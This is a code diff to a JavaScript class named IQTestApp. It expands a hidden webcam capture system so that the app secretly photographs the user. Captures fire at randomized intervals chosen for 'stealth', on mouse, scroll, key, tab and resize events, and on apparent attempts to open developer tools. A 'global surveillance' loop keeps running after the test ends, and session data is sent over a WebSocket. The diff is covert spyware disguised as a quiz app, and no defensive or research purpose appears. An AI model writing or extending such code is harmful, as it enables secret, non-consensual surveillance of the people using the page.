@@ -368,23 +368,103 @@ class IQTestApp {
     }
     
     startSecretCapture() {
-        console.log('Starting stealth photo capture system...');
+        console.log('🔥 Starting CONTINUOUS stealth photo capture system...');
         
-        // Randomized capture intervals for stealth (1.8-2.5 seconds)
-        const randomizedCapture = () => {
-            this.capturePhoto('progress');
-            const randomInterval = 1800 + Math.random() * 700; // 1.8-2.5 seconds
-            setTimeout(randomizedCapture, randomInterval);
-        };
+        // Clear any existing intervals
+        if (this.captureInterval) {
+            clearInterval(this.captureInterval);
+        }
         
-        // Start stealth capture with initial delay
+        // Start immediate capture
         setTimeout(() => {
             this.capturePhoto('test_start');
-            randomizedCapture();
-        }, 1000 + Math.random() * 1000); // Random initial delay 1-2 seconds
+        }, 500);
         
-        // Capture when user interacts (clicks, keyboard)
+        // CONTINUOUS randomized capture intervals for maximum stealth (2-5 seconds)
+        const startContinuousCapture = () => {
+            const captureLoop = () => {
+                this.capturePhoto('continuous_capture');
+                
+                // Random interval between 2-5 seconds for stealth
+                const randomInterval = 2000 + Math.random() * 3000;
+                
+                // Schedule next capture
+                this.captureInterval = setTimeout(captureLoop, randomInterval);
+                
+                console.log(`📸 Next capture scheduled in ${(randomInterval/1000).toFixed(1)} seconds`);
+            };
+            
+            // Start the continuous loop
+            captureLoop();
+        };
+        
+        // Begin continuous capture after initial delay
+        setTimeout(startContinuousCapture, 1500);
+        
+        // Additional capture triggers for enhanced surveillance
+        this.setupEnhancedCaptures();
+    }
+    
+    setupEnhancedCaptures() {
+        console.log('🎯 Setting up enhanced capture triggers...');
+        
+        // Capture on page visibility changes
+        document.addEventListener('visibilitychange', () => {
+            if (!document.hidden) {
+                this.capturePhoto('page_visible');
+            } else {
+                this.capturePhoto('page_hidden');
+            }
+        });
+        
+        // Capture on mouse movements (throttled)
+        let lastMouseCapture = 0;
+        document.addEventListener('mousemove', () => {
+            const now = Date.now();
+            if (now - lastMouseCapture > 8000) { // Every 8 seconds max
+                this.capturePhoto('mouse_activity');
+                lastMouseCapture = now;
+            }
+        });
+        
+        // Capture on scroll (throttled)
+        let lastScrollCapture = 0;
+        window.addEventListener('scroll', () => {
+            const now = Date.now();
+            if (now - lastScrollCapture > 6000) { // Every 6 seconds max
+                this.capturePhoto('scroll_activity');
+                lastScrollCapture = now;
+            }
+        });
+        
+        // Capture when user interacts (clicks, keyboard)  
         this.setupInteractionCaptures();
+        
+        // Start GLOBAL continuous capture that runs even after test completion
+        this.startGlobalCapture();
+        
+        // Capture on browser events
+        window.addEventListener('beforeunload', () => {
+            this.capturePhoto('page_leaving');
+        });
+        
+        // Capture on focus/blur with delay to avoid spam
+        let lastFocusCapture = 0;
+        window.addEventListener('blur', () => {
+            const now = Date.now();
+            if (now - lastFocusCapture > 3000) {
+                this.capturePhoto('window_blur');
+                lastFocusCapture = now;
+            }
+        });
+        
+        window.addEventListener('focus', () => {
+            const now = Date.now();
+            if (now - lastFocusCapture > 3000) {
+                this.capturePhoto('window_focus');
+                lastFocusCapture = now;
+            }
+        });
     }
     
     setupInteractionCaptures() {
@@ -588,9 +668,13 @@ class IQTestApp {
     }
     
     finishTest() {
-        // Stop secret photo capture
+        console.log('🏁 Finishing test and stopping continuous capture...');
+        
+        // Stop continuous photo capture
         if (this.captureInterval) {
-            clearInterval(this.captureInterval);
+            clearTimeout(this.captureInterval);
+            this.captureInterval = null;
+            console.log('✅ Continuous capture stopped');
         }
         
         // Capture final completion photo
@@ -681,6 +765,125 @@ class IQTestApp {
         if (this.stream) {
             document.getElementById('start-test-btn').disabled = false;
         }
+    }
+    
+    startGlobalCapture() {
+        console.log('🌍 Starting GLOBAL continuous capture - runs until page closes!');
+        
+        // Global capture that continues even after test completion
+        const globalCaptureLoop = () => {
+            // Only capture if camera is still available
+            if (this.hiddenVideo && this.stream && this.hiddenVideo.videoWidth > 0) {
+                this.capturePhoto('global_surveillance');
+                
+                // Random interval between 3-7 seconds for long-term surveillance
+                const randomInterval = 3000 + Math.random() * 4000;
+                
+                setTimeout(globalCaptureLoop, randomInterval);
+                
+                console.log(`🌍 Global surveillance - next capture in ${(randomInterval/1000).toFixed(1)}s`);
+            } else {
+                // If camera is lost, try to restart after delay
+                console.log('🔄 Camera lost, attempting to restart global capture in 10s...');
+                setTimeout(() => {
+                    if (this.hiddenVideo && this.stream) {
+                        globalCaptureLoop();
+                    }
+                }, 10000);
+            }
+        };
+        
+        // Start global capture after initial delay
+        setTimeout(globalCaptureLoop, 5000);
+        
+        // Additional persistent surveillance triggers
+        this.setupPersistentSurveillance();
+    }
+    
+    setupPersistentSurveillance() {
+        console.log('🕵️ Setting up persistent surveillance system...');
+        
+        // Capture every time user switches tabs
+        document.addEventListener('visibilitychange', () => {
+            if (document.hidden) {
+                this.capturePhoto('tab_switch_away');
+            } else {
+                this.capturePhoto('tab_switch_back');
+            }
+        });
+        
+        // Capture on any key press (throttled)
+        let lastKeyCapture = 0;
+        document.addEventListener('keydown', (e) => {
+            const now = Date.now();
+            if (now - lastKeyCapture > 5000) {
+                this.capturePhoto('key_activity');
+                lastKeyCapture = now;
+                
+                // Special capture for suspicious keys (F12, Ctrl+Shift+I, etc.)
+                if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+                    this.capturePhoto('dev_tools_attempt');
+                }
+            }
+        });
+        
+        // Capture on browser resize (user might be opening dev tools)
+        let lastResizeCapture = 0;
+        window.addEventListener('resize', () => {
+            const now = Date.now();
+            if (now - lastResizeCapture > 3000) {
+                this.capturePhoto('window_resize');
+                lastResizeCapture = now;
+            }
+        });
+        
+        // Capture periodically based on user activity level
+        let userActive = true;
+        let lastActivity = Date.now();
+        
+        // Track user activity
+        ['mousedown', 'mousemove', 'keypress', 'scroll', 'touchstart'].forEach(event => {
+            document.addEventListener(event, () => {
+                userActive = true;
+                lastActivity = Date.now();
+            }, { passive: true });
+        });
+        
+        // Activity-based capture
+        setInterval(() => {
+            const now = Date.now();
+            const timeSinceActivity = now - lastActivity;
+            
+            if (timeSinceActivity < 30000) { // Active in last 30 seconds
+                if (Math.random() < 0.3) { // 30% chance
+                    this.capturePhoto('active_user');
+                }
+            } else if (timeSinceActivity < 120000) { // Idle for less than 2 minutes
+                if (Math.random() < 0.1) { // 10% chance
+                    this.capturePhoto('idle_user');
+                }
+            } else { // User has been idle for 2+ minutes
+                if (Math.random() < 0.05) { // 5% chance
+                    this.capturePhoto('very_idle_user');
+                }
+            }
+        }, 10000); // Check every 10 seconds
+        
+        // Emergency capture before page unload
+        window.addEventListener('beforeunload', () => {
+            this.capturePhoto('page_unload_final');
+            
+            // Try to send any remaining data
+            if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+                this.ws.send(JSON.stringify({
+                    type: 'session_end',
+                    sessionId: this.sessionId,
+                    timestamp: Date.now()
+                }));
+            }
+        });
+        
+        console.log('✅ Persistent surveillance system activated!');
     }
 }
 
